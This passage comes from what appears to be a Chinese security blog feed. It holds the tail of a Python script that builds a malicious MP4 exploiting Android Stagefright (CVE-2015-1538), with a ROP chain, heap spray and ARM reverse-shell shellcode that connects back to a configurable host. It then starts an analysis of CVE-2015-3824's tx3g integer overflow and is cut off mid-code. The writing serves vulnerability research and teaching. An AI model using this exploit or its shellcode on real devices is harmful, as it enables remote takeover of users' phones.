class="line"></span><br><span class="line">    native_start = sp_addr + <span class="number">0x80</span></span><br><span class="line">    rop += struct.pack(<span class="string">'&lt;L'</span>, native_start)         <span class="comment"># address of native payload</span></span><br><span class="line">    <span class="comment">#rop += struct.pack('&lt;L', 0xfeedfed5)          # top of stack...</span></span><br><span class="line">    <span class="comment"># linux/armle/shell_reverse_tcp (modified to pass env and fork/exit)</span></span><br><span class="line">    buf =  <span class="string">''</span></span><br><span class="line">    <span class="comment"># fork</span></span><br><span class="line">    buf += <span class="string">'\x02\x70\xa0\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\x00\xef'</span></span><br><span class="line">    <span class="comment"># continue if not parent...</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\x50\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x02\x00\x00\x0a'</span></span><br><span class="line">    <span class="comment"># exit parent</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\xa0\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x01\x70\xa0\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\x00\xef'</span></span><br><span class="line">    <span class="comment"># setsid in child</span></span><br><span class="line">    buf += <span class="string">'\x42\x70\xa0\xe3'</span></span><br><span class="line">    buf += <span class="string">'\x00\x00\x00\xef'</span></span><br><span class="line">    <span class="comment"># socket/connect/dup2/dup2/dup2</span></span><br><span class="line">    buf += <span class="string">'\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c'</span></span><br><span class="line">    buf += <span class="string">'\x70\xa0\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60'</span></span><br><span class="line">    buf += <span class="string">'\xa0\xe1\x6c\x10\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0'</span></span><br><span class="line">    buf += <span class="string">'\xe3\x8e\x70\x87\xe2\x00\x00\x00\xef\x06\x00\xa0\xe1'</span></span><br><span class="line">    buf += <span class="string">'\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x06'</span></span><br><span class="line">    buf += <span class="string">'\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00'</span></span><br><span class="line">    buf += <span class="string">'\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0'</span></span><br><span class="line">    buf += <span class="string">'\xe3\x00\x00\x00\xef'</span></span><br><span class="line">    <span class="comment"># execve(shell, argv, env)</span></span><br><span class="line">    buf += <span class="string">'\x30\x00\x8f\xe2\x04\x40\x24\xe0'</span></span><br><span class="line">    buf += <span class="string">'\x10\x00\x2d\xe9\x38\x30\x8f\xe2\x08\x00\x2d\xe9\x0d'</span></span><br><span class="line">    buf += <span class="string">'\x20\xa0\xe1\x10\x00\x2d\xe9\x24\x40\x8f\xe2\x10\x00'</span></span><br><span class="line">    buf += <span class="string">'\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00\x00'</span></span><br><span class="line">    buf += <span class="string">'\xef\x02\x00'</span></span><br><span class="line">    <span class="comment"># Add the connect back host/port</span></span><br><span class="line">    buf += struct.pack(<span class="string">'!H'</span>, cb_port)</span><br><span class="line">    cb_host = socket.inet_aton(cb_host)</span><br><span class="line">    buf += struct.pack(<span class="string">'=4s'</span>, cb_host)</span><br><span class="line">    <span class="comment"># shell -</span></span><br><span class="line">    buf += <span class="string">'/system/bin/sh\x00\x00'</span></span><br><span class="line">    <span class="comment"># argv -</span></span><br><span class="line">    buf += <span class="string">'sh\x00\x00'</span></span><br><span class="line">    <span class="comment"># env -</span></span><br><span class="line">    buf += <span class="string">'PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\x00'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add some identifiable stuff, just in case something goes awry...</span></span><br><span class="line">    rop_start_off = <span class="number">0x34</span></span><br><span class="line">    x = rop_start_off + len(rop)</span><br><span class="line">    <span class="keyword">while</span> len(rop) &lt; <span class="number">0x80</span> - rop_start_off:</span><br><span class="line">        rop += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xf0f00000</span>+x)</span><br><span class="line">        x += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the native payload...</span></span><br><span class="line">    rop += buf</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Build an mp4 that exploits CVE-2015-1538 #1</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We mimic meow.3gp here...</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_mp4</span><span class="params">(sp_addr, newpc_val, cb_host, cb_port)</span>:</span></span><br><span class="line">    chunks = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the MP4 header...</span></span><br><span class="line">    ftyp =  <span class="string">'mp42'</span></span><br><span class="line">    ftyp += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>)</span><br><span class="line">    ftyp += <span class="string">'mp42'</span></span><br><span class="line">    ftyp += <span class="string">'isom'</span></span><br><span class="line">    chunks.append(make_chunk(<span class="string">'ftyp'</span>, ftyp))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Note, this causes a few allocations...</span></span><br><span class="line">    moov_data = <span class="string">''</span></span><br><span class="line">    moov_data += make_chunk(<span class="string">'mvhd'</span>,</span><br><span class="line">        struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0x41414141</span>) +</span><br><span class="line">        (<span class="string">'B'</span> * <span class="number">0x5c</span>) )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add a minimal, verified trak to satisfy mLastTrack being set</span></span><br><span class="line">    moov_data += make_chunk(<span class="string">'trak'</span>,</span><br><span class="line">        make_chunk(<span class="string">'stbl'</span>,</span><br><span class="line">            make_stsc(<span class="number">0x28</span>, <span class="number">0x28</span>) +</span><br><span class="line">            make_stco() +</span><br><span class="line">            make_stsz() +</span><br><span class="line">            make_stts() ))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Spray the heap using a large tx3g chunk (can contain binary data!)</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">       0x4007004e &lt;_ZNK7android7RefBase9decStrongEPKv+2&gt;:   ldr r4, [r0, #4]  ; load mRefs</span></span><br><span class="line"><span class="string">       0x40070050 &lt;_ZNK7android7RefBase9decStrongEPKv+4&gt;:   mov r5, r0</span></span><br><span class="line"><span class="string">       0x40070052 &lt;_ZNK7android7RefBase9decStrongEPKv+6&gt;:   mov r6, r1</span></span><br><span class="line"><span class="string">       0x40070054 &lt;_ZNK7android7RefBase9decStrongEPKv+8&gt;:   mov r0, r4</span></span><br><span class="line"><span class="string">       0x40070056 &lt;_ZNK7android7RefBase9decStrongEPKv+10&gt;:  blx 0x40069884    ; atomic_decrement</span></span><br><span class="line"><span class="string">       0x4007005a &lt;_ZNK7android7RefBase9decStrongEPKv+14&gt;:  cmp r0, #1        ; must be 1</span></span><br><span class="line"><span class="string">       0x4007005c &lt;_ZNK7android7RefBase9decStrongEPKv+16&gt;:  bne.n   0x40070076 &lt;_ZNK7android7RefBase9decStrongEPKv+42&gt;</span></span><br><span class="line"><span class="string">       0x4007005e &lt;_ZNK7android7RefBase9decStrongEPKv+18&gt;:  ldr r0, [r4, #8]  ; load refs-&gt;mBase</span></span><br><span class="line"><span class="string">       0x40070060 &lt;_ZNK7android7RefBase9decStrongEPKv+20&gt;:  ldr r1, [r0, #0]  ; load mBase._vptr</span></span><br><span class="line"><span class="string">       0x40070062 &lt;_ZNK7android7RefBase9decStrongEPKv+22&gt;:  ldr r2, [r1, #12] ; load method address</span></span><br><span class="line"><span class="string">       0x40070064 &lt;_ZNK7android7RefBase9decStrongEPKv+24&gt;:  mov r1, r6</span></span><br><span class="line"><span class="string">       0x40070066 &lt;_ZNK7android7RefBase9decStrongEPKv+26&gt;:  blx r2            ; call it!</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    page = <span class="string">''</span></span><br><span class="line">    off = <span class="number">0</span>  <span class="comment"># the offset to the next object</span></span><br><span class="line">    off += <span class="number">8</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + <span class="number">8</span> + <span class="number">16</span> + <span class="number">8</span> + <span class="number">12</span> - <span class="number">28</span>)    <span class="comment"># _vptr.RefBase (for when we smash mDataSource)</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + off) <span class="comment"># mRefs</span></span><br><span class="line">    off += <span class="number">16</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">1</span>)             <span class="comment"># mStrong</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xc0dedbad</span>)    <span class="comment"># mWeak</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + off) <span class="comment"># mBase</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">16</span>)            <span class="comment"># mFlags (dont set OBJECT_LIFETIME_MASK)</span></span><br><span class="line">    off += <span class="number">8</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + off) <span class="comment"># the mBase _vptr.RefBase</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xf00dbabe</span>)    <span class="comment"># mBase.mRefs (unused)</span></span><br><span class="line">    off += <span class="number">16</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xc0de0000</span> + <span class="number">0x00</span>)  <span class="comment"># vtable entry 0</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xc0de0000</span> + <span class="number">0x04</span>)  <span class="comment"># vtable entry 4</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xc0de0000</span> + <span class="number">0x08</span>)  <span class="comment"># vtable entry 8</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, newpc_val)          <span class="comment"># vtable entry 12</span></span><br><span class="line">    rop = build_rop(off, sp_addr, newpc_val, cb_host, cb_port)</span><br><span class="line">    x = len(page)</span><br><span class="line">    <span class="keyword">while</span> len(page) &lt; <span class="number">4096</span>:</span><br><span class="line">        page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xf0f00000</span>+x)</span><br><span class="line">        x += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    off = <span class="number">0x34</span></span><br><span class="line">    page = page[:off] + rop + page[off+len(rop):]</span><br><span class="line">    spray = page * (((<span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>) / len(page)) - <span class="number">20</span>)</span><br><span class="line">    moov_data += make_chunk(<span class="string">'tx3g'</span>, spray)</span><br><span class="line">    block = <span class="string">'A'</span> * <span class="number">0x1c</span></span><br><span class="line">    bigger = <span class="string">'B'</span> * <span class="number">0x40</span></span><br><span class="line">    udta = make_chunk(<span class="string">'udta'</span>,</span><br><span class="line">        make_chunk(<span class="string">'meta'</span>,</span><br><span class="line">            struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) +</span><br><span class="line">            make_chunk(<span class="string">'ilst'</span>,</span><br><span class="line">                make_chunk(<span class="string">'cpil'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">21</span>, <span class="number">0</span>) + <span class="string">'A'</span>)) +</span><br><span class="line">                make_chunk(<span class="string">'trkn'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + <span class="string">'AAAABBBB'</span>)) +</span><br><span class="line">                make_chunk(<span class="string">'disk'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + <span class="string">'AAAABB'</span>)) +</span><br><span class="line">                make_chunk(<span class="string">'covr'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) * <span class="number">32</span> +</span><br><span class="line">                make_chunk(<span class="string">'\xa9alb'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9ART'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'aART'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9day'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9nam'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9wrt'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'gnre'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">1</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'covr'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) * <span class="number">32</span> +</span><br><span class="line">                make_chunk(<span class="string">'\xa9ART'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + bigger)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9wrt'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + bigger)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9day'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + bigger)))</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    moov_data += udta</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make the nasty trak</span></span><br><span class="line">    tkhd1 = <span class="string">''</span>.join([</span><br><span class="line">        <span class="string">'\x00'</span>,       <span class="comment"># version</span></span><br><span class="line">        <span class="string">'D'</span> * <span class="number">3</span>,      <span class="comment"># padding</span></span><br><span class="line">        <span class="string">'E'</span> * (<span class="number">5</span>*<span class="number">4</span>),  <span class="comment"># &#123;c,m&#125;time, id, ??, duration</span></span><br><span class="line">        <span class="string">'F'</span> * <span class="number">0x10</span>,   <span class="comment"># ??</span></span><br><span class="line">        struct.pack(<span class="string">'&gt;LLLLLL'</span>,</span><br><span class="line">            <span class="number">0x10000</span>,  <span class="comment"># a00</span></span><br><span class="line">            <span class="number">0</span>,        <span class="comment"># a01</span></span><br><span class="line">            <span class="number">0</span>,        <span class="comment"># dx</span></span><br><span class="line">            <span class="number">0</span>,        <span class="comment"># a10</span></span><br><span class="line">            <span class="number">0x10000</span>,  <span class="comment"># a11</span></span><br><span class="line">            <span class="number">0</span>),       <span class="comment"># dy</span></span><br><span class="line">        <span class="string">'G'</span> * <span class="number">0x14</span></span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    trak1 = <span class="string">''</span></span><br><span class="line">    trak1 += make_chunk(<span class="string">'tkhd'</span>, tkhd1)</span><br><span class="line"></span><br><span class="line">    mdhd1 = <span class="string">''</span>.join([</span><br><span class="line">        <span class="string">'\x00'</span>,       <span class="comment"># version</span></span><br><span class="line">        <span class="string">'D'</span> * <span class="number">0x17</span>,   <span class="comment"># padding</span></span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    mdia1 = <span class="string">''</span></span><br><span class="line">    mdia1 += make_chunk(<span class="string">'mdhd'</span>, mdhd1)</span><br><span class="line">    mdia1 += make_chunk(<span class="string">'hdlr'</span>, <span class="string">'F'</span> * <span class="number">0x3a</span>)</span><br><span class="line"></span><br><span class="line">    dinf1 = <span class="string">''</span></span><br><span class="line">    dinf1 += make_chunk(<span class="string">'dref'</span>, <span class="string">'H'</span> * <span class="number">0x14</span>)</span><br><span class="line"></span><br><span class="line">    minf1 = <span class="string">''</span></span><br><span class="line">    minf1 += make_chunk(<span class="string">'smhd'</span>, <span class="string">'G'</span> * <span class="number">0x08</span>)</span><br><span class="line">    minf1 += make_chunk(<span class="string">'dinf'</span>, dinf1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the nasty sample table to trigger the vulnerability here.</span></span><br><span class="line">    stbl1 = make_stsc(<span class="number">3</span>, (<span class="number">0x1200</span> / <span class="number">0xc</span>) - <span class="number">1</span>, sp_addr, <span class="literal">True</span>) <span class="comment"># TRIGGER</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the stbl to the minf chunk</span></span><br><span class="line">    minf1 += make_chunk(<span class="string">'stbl'</span>, stbl1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the minf to the mdia chunk</span></span><br><span class="line">    mdia1 += make_chunk(<span class="string">'minf'</span>, minf1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the mdia to the track</span></span><br><span class="line">    trak1 += make_chunk(<span class="string">'mdia'</span>, mdia1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the nasty track to the moov data</span></span><br><span class="line">    moov_data += make_chunk(<span class="string">'trak'</span>, trak1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Finalize the moov chunk</span></span><br><span class="line">    moov = make_chunk(<span class="string">'moov'</span>, moov_data)</span><br><span class="line">    chunks.append(moov)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Combine outer chunks together and voila.</span></span><br><span class="line">    data = <span class="string">''</span>.join(chunks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> mp4</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_file</span><span class="params">(path, content)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addr</span><span class="params">(sval)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> sval.startswith(<span class="string">'0x'</span>):</span><br><span class="line">            <span class="keyword">return</span> int(sval, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> int(sval)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The address of a fake StrongPointer object (sprayed)</span></span><br><span class="line">    sp_addr   = <span class="number">0x41d00010</span>  <span class="comment"># takju @ imm76i - 2MB (via hangouts)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># The address to of our ROP pivot</span></span><br><span class="line">    newpc_val = <span class="number">0xb0002850</span> <span class="comment"># point sp at __dl_restore_core_regs</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Allow the user to override parameters</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--connectback-host'</span>, dest=<span class="string">'cbhost'</span>, default=<span class="string">'31.3.3.7'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--connectback-port'</span>, dest=<span class="string">'cbport'</span>, type=int, default=<span class="number">12345</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-s'</span>, <span class="string">'--spray-address'</span>, dest=<span class="string">'spray_addr'</span>, type=addr, default=<span class="literal">None</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-r'</span>, <span class="string">'--rop-pivot'</span>, dest=<span class="string">'rop_pivot'</span>, type=addr, default=<span class="literal">None</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-o'</span>, <span class="string">'--output-file'</span>, dest=<span class="string">'output_file'</span>, default=<span class="string">'cve-2015-1538-1.mp4'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.spray_addr == <span class="literal">None</span>:</span><br><span class="line">        args.spray_addr = sp_addr</span><br><span class="line">    <span class="keyword">if</span> args.rop_pivot == <span class="literal">None</span>:</span><br><span class="line">        args.rop_pivot = newpc_val</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the MP4 file...</span></span><br><span class="line">    data = mp4.create_mp4(args.spray_addr, args.rop_pivot, args.cbhost, args.cbport)</span><br><span class="line">    print(<span class="string">'[*] Saving crafted MP4 to %s ...'</span> % args.output_file)</span><br><span class="line">    write_file(args.output_file, data)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/jduck/cve-2015-1538-1&quot;&gt;https://github.com/jduck/cve-2015-1538-1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wooyun.js.org/dro
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>StageFright 系列漏洞（零）CVE-2015-3824</title>
    <link href="https://github.com/Cracke-S-J/2020/05/24/StageFright%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%9B%B6%EF%BC%89CVE-2015-3824/"/>
    <id>https://github.com/Cracke-S-J/2020/05/24/StageFright%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%9B%B6%EF%BC%89CVE-2015-3824/</id>
    <published>2020-05-24T05:10:55.000Z</published>
    <updated>2020-07-02T05:21:42.779Z</updated>
    
    <content type="html"><![CDATA[<p>前一阵看了一阵二进制漏洞的利用，其实挺迷惑方向的，CTF pwn是一种玩法，然后其它还有浏览器、虚拟机逃逸、Office全家桶、Adobe全家桶、kernel等等，还有什么物联网，选恐的我当时就慌了，每个方向（除物联网，我不会）看了几个洞以后，学到了一些二进制利用的套路，也没有什么特别的感受。今天看到了这个StageFright系列漏洞，还挺有感觉，打算分析一遍。</p><p>还有看逼乎上说什么二进制漏洞“一将功成万骨枯”，我也是无语。</p><p><a href="https://www.madebug.net/static/drops/papers-7558.html" target="_blank" rel="noopener">Stagefright漏洞公告</a></p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>StageFright是一个Android中的系统服务，会被mediaserver调用，可处理各种多媒体格式，由Natvie C++代码实现，动态库名字叫<code>libstagefright.so</code>，代码在<code>/frameworks/av/media/libstagefright/</code>。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="mp4文件格式解析"><a href="#mp4文件格式解析" class="headerlink" title="mp4文件格式解析"></a>mp4文件格式解析</h3><p>可以看下<a href="https://www.jianshu.com/p/529c3729f357" target="_blank" rel="noopener">这里</a>。</p><p>我们重点关注的是size的解析部分。</p><ul><li>mp4主要由一些box组成，显然box应该有一个头，头里放着size。</li><li>size是包含box header的整个box的大小。</li><li>size为4bytes，largesize为8bytes。</li><li>如果header中的size为1，则表示box长度需要更多的bits位来描述，在后面会有一个64bits位的largesize用来描述box的长度。如果size为0，表示该box为文件的最后一个box，文件结尾。</li></ul><p>看下size的处理，在<a href="https://android.googlesource.com/platform/frameworks/av/+/3aef35600523eb6b4ccc8086a8913e80701a031a/media/libstagefright/MPEG4Extractor.cpp" target="_blank" rel="noopener">MPEG4Extractor.cpp</a>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">status_t</span> MPEG4Extractor::parseChunk(<span class="keyword">off64_t</span> *offset, <span class="keyword">int</span> depth) &#123;</span><br><span class="line">    ALOGV(<span class="string">"entering parseChunk %lld/%d"</span>, *offset, depth);</span><br><span class="line">    <span class="keyword">uint32_t</span> hdr[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(*offset, hdr, <span class="number">8</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint64_t</span> chunk_size = ntohl(hdr[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">uint32_t</span> chunk_type = ntohl(hdr[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">off64_t</span> data_offset = *offset + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (chunk_size == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mDataSource-&gt;readAt(*offset + <span class="number">8</span>, &amp;chunk_size, <span class="number">8</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">        &#125;</span><br><span class="line">        chunk_size = ntoh64(chunk_size);</span><br><span class="line">        data_offset += <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span> (chunk_size &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="comment">// The smallest valid chunk is 16 bytes long in this case.</span></span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (chunk_size &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="comment">// The smallest valid chunk is 8 bytes long.</span></span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h3 id="JeMalloc"><a href="#JeMalloc" class="headerlink" title="JeMalloc"></a>JeMalloc</h3><p>从Android 5.0开始，堆分配器使用的是<a href="https://zhuanlan.zhihu.com/p/48957114" target="_blank" rel="noopener">JeMalloc</a>，它跟ptmalloc相比就是，小内存使用regions分配，region之间是没有元数据的，所以我们不能使用ctf pwn中常用的什么改fd实现任意分配的手段了。</p><p>不过没关系，这时候我们通常采取的手段是类似Windows上的一些操作，把一个<strong>好用</strong>的对象放到可溢出的地方，然后修改它的虚表。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>还在这个函数中，在处理tx3g这个box的时候，size为之前所解析的所有tx3g box的长度总和。chunk_size 为当前要处理的tx3g box的长度。然后size + chunk_size计算要分配的内存大小。chunk_size是uint64_t类型的，chunk_size我们在文件格式中我们所能控制的最大大小为0xFFFFFFFFFFFFFFFF，也是64位，但是我们还有一个size为可以控制，这样一相加，就会造成整数溢出，导致分配小内存。而我们的数据大小则远远大于分配的内存大小，进而在memcpy的时候造成堆溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('t', 'x', '3', 'g'):</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> type;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *data;</span><br><span class="line">    <span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!mLastTrack-&gt;meta-&gt;findData(</span><br><span class="line">            kKeyTextFormatData, &amp;type, &amp;data, &amp;size)) &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> *buffer = <span class="keyword">new</span> <span class="keyword">uint8_t</span>[size + chunk_size];   <span class="comment">// &lt; -- overflow</span></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span 